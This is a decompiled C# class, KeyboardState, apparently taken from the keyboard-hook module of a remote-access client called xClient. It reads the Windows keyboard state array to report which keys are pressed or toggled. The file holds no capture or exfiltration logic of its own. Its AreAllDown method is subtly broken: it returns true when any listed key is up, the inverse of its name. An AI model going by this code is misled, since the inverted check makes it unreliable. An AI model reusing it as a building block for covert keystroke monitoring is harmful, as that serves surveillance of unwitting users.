using System;
using System.Collections.Generic;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation
{
	// Token: 0x02000066 RID: 102
	internal class KeyboardState
	{
		// Token: 0x060002C1 RID: 705 RVA: 0x000034F7 File Offset: 0x000016F7
		private KeyboardState(byte[] keyboardStateNative)
		{
			this.m_KeyboardStateNative = keyboardStateNative;
		}

		// Token: 0x060002C2 RID: 706 RVA: 0x0000E8A0 File Offset: 0x0000CAA0
		public static KeyboardState GetCurrent()
		{
			byte[] array = new byte[256];
			KeyboardNativeMethods.GetKeyboardState(array);
			return new KeyboardState(array);
		}

		// Token: 0x060002C3 RID: 707 RVA: 0x00003506 File Offset: 0x00001706
		internal byte[] GetNativeState()
		{
			return this.m_KeyboardStateNative;
		}

		// Token: 0x060002C4 RID: 708 RVA: 0x0000E8C8 File Offset: 0x0000CAC8
		public bool IsDown(Keys key)
		{
			byte keyState = this.GetKeyState(key);
			return KeyboardState.GetHighBit(keyState);
		}

		// Token: 0x060002C5 RID: 709 RVA: 0x0000E8E4 File Offset: 0x0000CAE4
		public bool IsToggled(Keys key)
		{
			byte keyState = this.GetKeyState(key);
			return KeyboardState.GetLowBit(keyState);
		}

		// Token: 0x060002C6 RID: 710 RVA: 0x0000E900 File Offset: 0x0000CB00
		public bool AreAllDown(IEnumerable<Keys> keys)
		{
			foreach (Keys key in keys)
			{
				if (!this.IsDown(key))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x060002C7 RID: 711 RVA: 0x0000E954 File Offset: 0x0000CB54
		private byte GetKeyState(Keys key)
		{
			if (key < Keys.None || key > (Keys)255)
			{
				throw new ArgumentOutOfRangeException("key", key, "The value must be between 0 and 255.");
			}
			return this.m_KeyboardStateNative[(int)key];
		}

		// Token: 0x060002C8 RID: 712 RVA: 0x0000350E File Offset: 0x0000170E
		private static bool GetHighBit(byte value)
		{
			return value >> 7 != 0;
		}

		// Token: 0x060002C9 RID: 713 RVA: 0x00003519 File Offset: 0x00001719
		private static bool GetLowBit(byte value)
		{
			return (value & 1) != 0;
		}

		// Token: 0x0400010F RID: 271
		private readonly byte[] m_KeyboardStateNative;
	}
}
